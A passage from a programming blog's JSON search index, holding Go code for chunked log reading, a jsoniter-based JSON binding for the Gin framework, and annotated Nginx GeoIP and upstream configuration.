style=\"color:#a6e22e\"\u003elogCreationTimeString\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\t\t\u003cspan style=\"color:#66d9ef\"\u003eif\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eerr\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e!=\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003enil\u003c/span\u003e {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\t\t\t\u003cspan style=\"color:#a6e22e\"\u003efmt\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003ePrintf\u003c/span\u003e(\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\\n Could not able to parse the time :%s for log : %v\u0026#34;\u003c/span\u003e, \u003cspan style=\"color:#a6e22e\"\u003elogCreationTimeString\u003c/span\u003e, \u003cspan style=\"color:#a6e22e\"\u003etext\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\t\t\t\u003cspan style=\"color:#66d9ef\"\u003ereturn\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\t\t}\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\t\t\u003cspan style=\"color:#66d9ef\"\u003eif\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003elogCreationTime\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eAfter\u003c/span\u003e(\u003cspan style=\"color:#a6e22e\"\u003estart\u003c/span\u003e) \u003cspan style=\"color:#f92672\"\u003e\u0026amp;\u0026amp;\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003elogCreationTime\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eBefore\u003c/span\u003e(\u003cspan style=\"color:#a6e22e\"\u003eend\u003c/span\u003e) {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\t\t\t\u003cspan style=\"color:#75715e\"\u003e// fmt.Println(text)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\t\t}\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\t}\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t}(\u003cspan style=\"color:#a6e22e\"\u003ei\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e*\u003c/span\u003e\u003cspan style=\"color:#a6e22e\"\u003echunkSize\u003c/span\u003e, int(\u003cspan style=\"color:#a6e22e\"\u003emath\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eMin\u003c/span\u003e(float64((\u003cspan style=\"color:#a6e22e\"\u003ei\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e+\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e1\u003c/span\u003e)\u003cspan style=\"color:#f92672\"\u003e*\u003c/span\u003e\u003cspan style=\"color:#a6e22e\"\u003echunkSize\u003c/span\u003e), float64(len(\u003cspan style=\"color:#a6e22e\"\u003elogsSlice\u003c/span\u003e)))))\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t}\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#a6e22e\"\u003ewg2\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eWait\u003c/span\u003e()\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#a6e22e\"\u003elogsSlice\u003c/span\u003e = \u003cspan style=\"color:#66d9ef\"\u003enil\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e}\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e","tags":["URL","Go"],"title":"25秒读取16GB文件，Go怎么做到的？"},{"categories":["URL","Go","GIN","jsoniter"],"contents":" Gin 框架绑定 JSON 参数使用 jsoniter simple go build -tags=jsoniter ./... custom implement BindingBody interface // github.com/gin-gonic/gin@v1.6.3/binding/binding.go:36 // Binding describes the interface which needs to be implemented for binding the // data present in the request such as JSON request body, query parameters or // the form POST. type Binding interface { Name() string Bind(*http.Request, interface{}) error } // BindingBody adds BindBody method to Binding. BindBody is similar with Bind, // but it reads the body from supplied bytes instead of req.Body. type BindingBody interface { Binding BindBody([]byte, interface{}) error } package custom import ( \u0026#34;bytes\u0026#34; \u0026#34;fmt\u0026#34; \u0026#34;io\u0026#34; \u0026#34;net/http\u0026#34; jsoniter \u0026#34;github.com/json-iterator/go\u0026#34; \u0026#34;github.com/gin-gonic/gin/binding\u0026#34; ) // BindingJSON 替换Gin默认的binding，支持更丰富JSON功能 var BindingJSON = jsonBinding{} // 可以自定义jsoniter配置或者添加插件 var json = jsoniter.ConfigCompatibleWithStandardLibrary type jsonBinding struct{} func (jsonBinding) Name() string { return \u0026#34;json\u0026#34; } func (jsonBinding) Bind(req *http.Request, obj interface{}) error { if req == nil || req.Body == nil { return fmt.Errorf(\u0026#34;invalid request\u0026#34;) } return decodeJSON(req.Body, obj) } func (jsonBinding) BindBody(body []byte, obj interface{}) error { return decodeJSON(bytes.NewReader(body), obj) } func decodeJSON(r io.Reader, obj interface{}) error { decoder := json.NewDecoder(r) if binding.EnableDecoderUseNumber { decoder.UseNumber() } if binding.EnableDecoderDisallowUnknownFields { decoder.DisallowUnknownFields() } if err := decoder.Decode(obj); err != nil { return err } return validate(obj) } func validate(obj interface{}) error { if binding.Validator == nil { return nil } return binding.Validator.ValidateStruct(obj) } // binding.JSON 替换成自定义的 ctx.ShouldBindWith(ms, binding.JSON) ctx.ShouldBindBodyWith(ms, binding.JSON) ","date":"November 22, 2021","hero":"/images/hero/go.svg","permalink":"https://linzeyan.github.io/zh-tw/posts/2021/20211122-go-gin-jsoniter/","summary":"\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://mp.weixin.qq.com/s/nf9OYpN3f8HMDj_xkdCzdw\" target=\"_blank\" rel=\"noopener\"\u003eGin 框架绑定 JSON 参数使用 jsoniter\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch3 id=\"simple\"\u003esimple\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003ego build -tags\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003ejsoniter ./...\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch3 id=\"custom\"\u003ecustom\u003c/h3\u003e\n\u003ch4 id=\"implement-bindingbody-interface\"\u003eimplement \u003ccode\u003eBindingBody\u003c/code\u003e interface\u003c/h4\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-go\" data-lang=\"go\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e// github.com/gin-gonic/gin@v1.6.3/binding/binding.go:36\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e// Binding describes the interface which needs to be implemented for binding the\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e// data present in the request such as JSON request body, query parameters or\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e// the form POST.\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003etype\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eBinding\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003einterface\u003c/span\u003e {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#a6e22e\"\u003eName\u003c/span\u003e() \u003cspan style=\"color:#66d9ef\"\u003estring\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#a6e22e\"\u003eBind\u003c/span\u003e(\u003cspan style=\"color:#f92672\"\u003e*\u003c/span\u003e\u003cspan style=\"color:#a6e22e\"\u003ehttp\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eRequest\u003c/span\u003e, \u003cspan style=\"color:#66d9ef\"\u003einterface\u003c/span\u003e{}) \u003cspan style=\"color:#66d9ef\"\u003eerror\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e}\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e// BindingBody adds BindBody method to Binding. BindBody is similar with Bind,\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e// but it reads the body from supplied bytes instead of req.Body.\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003etype\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eBindingBody\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003einterface\u003c/span\u003e {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#a6e22e\"\u003eBinding\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#a6e22e\"\u003eBindBody\u003c/span\u003e([]\u003cspan style=\"color:#66d9ef\"\u003ebyte\u003c/span\u003e, \u003cspan style=\"color:#66d9ef\"\u003einterface\u003c/span\u003e{}) \u003cspan style=\"color:#66d9ef\"\u003eerror\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e}\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-go\" data-lang=\"go\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003epackage\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003ecustom\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003eimport\u003c/span\u003e (\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;bytes\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;fmt\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;io\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;net/http\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#a6e22e\"\u003ejsoniter\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;github.com/json-iterator/go\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;github.com/gin-gonic/gin/binding\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e// BindingJSON 替换Gin默认的binding，支持更丰富JSON功能\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003evar\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eBindingJSON\u003c/span\u003e = \u003cspan style=\"color:#a6e22e\"\u003ejsonBinding\u003c/span\u003e{}\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e// 可以自定义jsoniter配置或者添加插件\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003evar\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003ejson\u003c/span\u003e = \u003cspan style=\"color:#a6e22e\"\u003ejsoniter\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eConfigCompatibleWithStandardLibrary\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003etype\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003ejsonBinding\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003estruct\u003c/span\u003e{}\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003efunc\u003c/span\u003e (\u003cspan style=\"color:#a6e22e\"\u003ejsonBinding\u003c/span\u003e) \u003cspan style=\"color:#a6e22e\"\u003eName\u003c/span\u003e() \u003cspan style=\"color:#66d9ef\"\u003estring\u003c/span\u003e {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#66d9ef\"\u003ereturn\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;json\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e}\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003efunc\u003c/span\u003e (\u003cspan style=\"color:#a6e22e\"\u003ejsonBinding\u003c/span\u003e) \u003cspan style=\"color:#a6e22e\"\u003eBind\u003c/span\u003e(\u003cspan style=\"color:#a6e22e\"\u003ereq\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e*\u003c/span\u003e\u003cspan style=\"color:#a6e22e\"\u003ehttp\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eRequest\u003c/span\u003e, \u003cspan style=\"color:#a6e22e\"\u003eobj\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003einterface\u003c/span\u003e{}) \u003cspan style=\"color:#66d9ef\"\u003eerror\u003c/span\u003e {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#66d9ef\"\u003eif\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003ereq\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e==\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003enil\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e||\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003ereq\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eBody\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e==\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003enil\u003c/span\u003e {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#66d9ef\"\u003ereturn\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003efmt\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eErrorf\u003c/span\u003e(\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;invalid request\u0026#34;\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    }\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#66d9ef\"\u003ereturn\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003edecodeJSON\u003c/span\u003e(\u003cspan style=\"color:#a6e22e\"\u003ereq\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eBody\u003c/span\u003e, \u003cspan style=\"color:#a6e22e\"\u003eobj\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e}\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003efunc\u003c/span\u003e (\u003cspan style=\"color:#a6e22e\"\u003ejsonBinding\u003c/span\u003e) \u003cspan style=\"color:#a6e22e\"\u003eBindBody\u003c/span\u003e(\u003cspan style=\"color:#a6e22e\"\u003ebody\u003c/span\u003e []\u003cspan style=\"color:#66d9ef\"\u003ebyte\u003c/span\u003e, \u003cspan style=\"color:#a6e22e\"\u003eobj\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003einterface\u003c/span\u003e{}) \u003cspan style=\"color:#66d9ef\"\u003eerror\u003c/span\u003e {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#66d9ef\"\u003ereturn\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003edecodeJSON\u003c/span\u003e(\u003cspan style=\"color:#a6e22e\"\u003ebytes\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eNewReader\u003c/span\u003e(\u003cspan style=\"color:#a6e22e\"\u003ebody\u003c/span\u003e), \u003cspan style=\"color:#a6e22e\"\u003eobj\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e}\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003efunc\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003edecodeJSON\u003c/span\u003e(\u003cspan style=\"color:#a6e22e\"\u003er\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eio\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eReader\u003c/span\u003e, \u003cspan style=\"color:#a6e22e\"\u003eobj\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003einterface\u003c/span\u003e{}) \u003cspan style=\"color:#66d9ef\"\u003eerror\u003c/span\u003e {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#a6e22e\"\u003edecoder\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e:=\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003ejson\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eNewDecoder\u003c/span\u003e(\u003cspan style=\"color:#a6e22e\"\u003er\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#66d9ef\"\u003eif\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003ebinding\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eEnableDecoderUseNumber\u003c/span\u003e {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#a6e22e\"\u003edecoder\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eUseNumber\u003c/span\u003e()\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    }\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#66d9ef\"\u003eif\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003ebinding\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eEnableDecoderDisallowUnknownFields\u003c/span\u003e {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#a6e22e\"\u003edecoder\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eDisallowUnknownFields\u003c/span\u003e()\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    }\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#66d9ef\"\u003eif\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eerr\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e:=\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003edecoder\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eDecode\u003c/span\u003e(\u003cspan style=\"color:#a6e22e\"\u003eobj\u003c/span\u003e); \u003cspan style=\"color:#a6e22e\"\u003eerr\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e!=\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003enil\u003c/span\u003e {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#66d9ef\"\u003ereturn\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eerr\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    }\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#66d9ef\"\u003ereturn\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003evalidate\u003c/span\u003e(\u003cspan style=\"color:#a6e22e\"\u003eobj\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e}\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003efunc\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003evalidate\u003c/span\u003e(\u003cspan style=\"color:#a6e22e\"\u003eobj\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003einterface\u003c/span\u003e{}) \u003cspan style=\"color:#66d9ef\"\u003eerror\u003c/span\u003e {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#66d9ef\"\u003eif\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003ebinding\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eValidator\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e==\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003enil\u003c/span\u003e {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#66d9ef\"\u003ereturn\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003enil\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    }\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#66d9ef\"\u003ereturn\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003ebinding\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eValidator\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eValidateStruct\u003c/span\u003e(\u003cspan style=\"color:#a6e22e\"\u003eobj\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e}\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-go\" data-lang=\"go\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e// binding.JSON 替换成自定义的\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#a6e22e\"\u003ectx\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eShouldBindWith\u003c/span\u003e(\u003cspan style=\"color:#a6e22e\"\u003ems\u003c/span\u003e, \u003cspan style=\"color:#a6e22e\"\u003ebinding\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eJSON\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#a6e22e\"\u003ectx\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eShouldBindBodyWith\u003c/span\u003e(\u003cspan style=\"color:#a6e22e\"\u003ems\u003c/span\u003e, \u003cspan style=\"color:#a6e22e\"\u003ebinding\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eJSON\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e","tags":["URL","Go","GIN","jsoniter"],"title":"Gin 框架绑定 JSON 参数使用 jsoniter"},{"categories":["Nginx"],"contents":"紀錄 Nginx 設定檔及說明 檔案結構 . ├── geoip.conf ├── nginx.conf ├── sites-available │ ├── default.conf ├── sites-enabled │ ├── default.conf -\u0026gt; ../sites-available/default.conf ├── upstream.conf geoip.conf ## module: ngx_http_geoip2_module ## https://github.com/leev/ngx_http_geoip2_module ## 讀取 GeoIP 資料庫，並進行變數設定 geoip2 /usr/share/GeoIP/GeoLite2-Country.mmdb { auto_reload 60m; $geoip2_metadata_country_build metadata build_epoch; ## 自定義 $geoip2_data_country_code 值為 $remote_addr 對應的 ISO 3116 規範的國碼 $geoip2_data_country_code source=$remote_addr country iso_code; ## 自定義 $geoip2_data_country_name 值為對應的英文城市名 $geoip2_data_country_name country names en; } upstream.conf ## module: ngx_http_upstream_module ## 定義 server 組別 upstream to_nodejs1 { ## server address [parameters]; 定義 server ## parameters: ## weight=number 定義權重，預設為 1 ## max_fails=number 設定到 upstream server 的最大重試次數，預設為 1 ## fail_timeout=time 設定到達 max_fails 次數之後，暫停向此 upstream server 傳送請求的時間，預設為 10 秒 ## backup 標記此 upstream server 為備用，當其他 upstream server 不可用時，此 upstream server 可接受請求 ## down 標記此 upstream server 為不可用 server 10.7.0.12:90 max_fails=3 fail_timeout=5s; server 10.7.0.12:91 max_fails=3 fail_timeout=5s backup; } upstream to_nodejs2 { server 10.7.0.12:92 max_fails=3 fail_timeout=5s; server 10.7.0.12:93 max_fails=3 fail_timeout=5s backup; } upstream to_nodejs95 { server 10.7.0.12:95 max_fails=3 fail_timeout=5s; } ## module: ngx_http_map_module ## map string $variable { ... } 建立一個新的變數 map $arg_agent $game_api { ## $arg_agent 請求中 agent 的值(https://abc.com/?agent=123) ## agent=60037, $game_api 的值為 to_nodejs95 60037 to_nodejs95; ## agent 結尾是 1, 2, 3, 或是 4, $game_api 的值為 to_nodejs1 ~*1$ to_nodejs1; ~*2$ to_nodejs1; ~*3$ to_nodejs1; ~*4$ to_nodejs1; ## 若 agent 不符合上開規則，預設 $game_api 的值為 to_nodejs2 default 